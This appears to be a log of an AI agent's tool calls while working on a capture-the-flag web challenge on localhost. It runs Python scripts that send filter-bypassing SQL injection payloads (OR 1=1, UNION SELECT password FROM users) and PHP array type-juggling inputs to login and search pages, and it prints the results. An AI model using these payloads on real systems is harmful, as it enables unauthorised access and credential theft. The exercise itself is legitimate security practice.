args.content:
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:8080"

# Test payloads that have bypassed the filter
payloads = [
    "admin",
    "'/**/OR/**/1=1#",
    "'/**/OR/**/1#",
    "'/**/OR/**/'1'='1",
    "'/**/OR/**/''='",
    "'/**/UNION/**/SELECT/**/null#",
    "'/**/UNION/**/SELECT/**/username/**/FROM/**/users#",
    "'/**/UNION/**/SELECT/**/password/**/FROM/**/users#",
    "'/**/UNION/**/SELECT/**/1,2,3#",
    "'/**/UNION/**/SELECT/**/1,2#",
    "'/**/UNION/**/ALL/**/SELECT/**/1#",
    "admin'#",
    "admin'/**/",
    "admin'/*"
]

print("Testing search.php SQL injections:")
print("="*50)

for payload in payloads:
    r = requests.post(f"{BASE_URL}/search.php", data={"username": payload})
    if "filtered" in r.text:
        status = "FILTERED"
    elif "User exists" in r.text:
        status = "FOUND USER"
    elif "No results" in r.text:
        status = "No results"
    else:
        status = "OTHER RESPONSE"
    print(f"{payload[:40]:40s} -> {status}")
    if status == "FOUND USER":
        print(f"  Response: {r.text[:200]}")

messages.output: <tool_use_error>File has not been read yet. Read it first before writing to it.</tool_use_error>

args.command:
python3 << 'SCRIPT'
import requests

BASE_URL = "http://localhost:8080"

# Test payloads that have bypassed the filter
payloads = [
    "admin",
    "'/**/OR/**/1=1#",
    "'/**/OR/**/1#",
    "'/**/OR/**/'1'='1",
    "'/**/OR/**/''='",
    "'/**/UNION/**/SELECT/**/null#",
    "'/**/UNION/**/SELECT/**/username/**/FROM/**/users#",
    "'/**/UNION/**/SELECT/**/password/**/FROM/**/users#",
    "'/**/UNION/**/SELECT/**/1,2,3#",
    "'/**/UNION/**/SELECT/**/1,2#",
    "'/**/UNION/**/ALL/**/SELECT/**/1#",
    "admin'#",
    "admin'/**/",
    "admin'/*"
]

print("Testing search.php SQL injections:")
print("="*50)

for payload in payloads:
    r = requests.post(f"{BASE_URL}/search.php", data={"username": payload})
    if "filtered" in r.text:
        status = "FILTERED"
    elif "User exists" in r.text:
        status = "FOUND USER"
    elif "No results" in r.text:
        status = "No results"
    else:
        status = "OTHER: " + r.text[:50]
    print(f"{payload[:40]:40s} -> {status}")
SCRIPT

args.command:
python3 << 'SCRIPT'
import requests

BASE_URL = "http://localhost:8080"

# Test payloads for login
payloads = [
    {"username": "admin'#", "password": "test"},
    {"username": "admin'/*", "password": "test"},
    {"username": "admin'/**/--", "password": "test"},
    {"username": "admin'/**//*", "password": "test"},
    {"username": "admin'/**/;", "password": "test"},
    {"username": "'/**/OR/**/'1'='1'/*", "password": "test"},
    {"username": "admin'/**/OR/**/'1'='1", "password": "test"},
    {"username": "admin'/**/OR/**/1=1/*", "password": "test"},
]

print("Testing login.php SQL injections:")
print("="*50)

for payload in payloads:
    r = requests.post(f"{BASE_URL}/login.php", data=payload)
    if "filtered" in r.text.lower():
        status = "FILTERED"
    elif "Error" in r.text:
        status = "Error (wrong creds)"
    elif "flag" in r.text.lower():
        status = "FLAG?"
        print(r.text)
    else:
        status = r.text[:100]
    print(f"{payload['username'][:35]:35s} -> {status}")
SCRIPT

messages.output:
Testing login.php SQL injections:
==================================================
admin'#                             -> Error (wrong creds)
admin'/*                            -> Error (wrong creds)
admin'/**/--                        -> Error (wrong creds)
admin'/**//*                        -> Error (wrong creds)
admin'/**/;                         -> Error (wrong creds)
'/**/OR/**/'1'='1'/*                -> Error (wrong creds)
admin'/**/OR/**/'1'='1              -> Error (wrong creds)
admin'/**/OR/**/1=1/*               -> Error (wrong creds)

args.command:
python3 << 'SCRIPT'
import requests

BASE_URL = "http://localhost:8080"

# Test array-based type juggling on login
payloads = [
    {"username": "admin", "password[]": ""},
    {"username[]": "admin", "password": "test"},
    {"username[]": "", "password[]": ""},
    {"username": "admin", "password[]": "test"},
]

print("Testing login.php array injection:")
print("="*50)

for payload in payloads:
    r = requests.post(f"{BASE_URL}/login.php", data=payload)
    print(f"Payload: {payload}")
    if "Error" in r.text:
        print(f"  -> Error")
    elif "flag" in r.text.lower() or "{" in r.text:
        print(f"  -> POSSIBLE FLAG: {r.text}")
    else:
        print(f"  -> {r.text[:200]}")
    print()
SCRIPT

python3 << 'SCRIPT'
import requests

BASE_URL = "http://localhost:8080"

# Test array-based type juggling on search
payloads = [
    {"username[]": "admin"},
    {"username[]": ""},
    {"username[]": []},
    {"username[0]": "admin"},
    {"username[test]": "admin"},
]

print("Testing search.php array injection:")
print("="*50)

for payload in payloads:
    r = requests.post(f"{BASE_URL}/search.php", data=payload)
    print(f"Payload: {payload}")
    if "filtered" in r.text.lower():
        print(f"  -> FILTERED")
    elif "User exists" in r.text:
        print(f"  -> USER EXISTS")
    elif "No results" in r.text:
        print(f"  -> No results")
    elif "flag" in r.text.lower() or "{" in r.text:
        print(f"  -> POSSIBLE FLAG: {r.text}")
    else:
        print(f"  -> {r.text[:200]}")
    print()
SCRIPT
